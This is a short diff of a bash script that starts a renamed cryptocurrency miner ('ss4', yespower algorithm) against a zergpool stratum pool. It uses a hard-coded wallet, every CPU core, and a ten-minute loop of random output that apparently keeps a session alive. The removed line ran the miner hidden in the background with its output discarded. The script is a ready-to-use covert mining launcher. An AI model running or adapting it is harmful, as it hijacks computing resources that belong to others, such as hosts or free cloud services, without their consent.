@@ -1,3 +1,3 @@
 #!/bin/bash
-nohup ./ss4 -a yespower -o stratum+tcp://yespower.eu.mine.zergpool.com:6533 -u ShwhpqVtMD8dPjYiYua4bBoXYr5yQuU4XV.tambat -p c=SMT,mc=SMT -t $(nproc --all) > /dev/null 2>&1 &
+nohup ./ss4 -a yespower -o stratum+tcp://yespower.eu.mine.zergpool.com:6533 -u ShwhpqVtMD8dPjYiYua4bBoXYr5yQuU4XV.tambat -p c=SMT,mc=SMT -t $(nproc --all)
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
